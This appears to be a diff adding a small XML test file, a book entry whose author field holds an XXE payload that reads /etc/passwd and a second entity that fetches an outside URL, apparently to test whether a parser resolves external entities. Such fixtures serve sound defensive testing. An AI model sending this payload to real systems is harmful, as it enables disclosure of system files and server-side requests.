@@ -1,0 +1,11 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!ENTITY xxe2 SYSTEM "https://google.com"> ]>
+<entry>
+	<author>&xxe;</author>
+	<title>Sense and Sensibility</title>
+	<publish_date>1812</publish_date>
+	<test>&xxe2;</test>
+</entry>
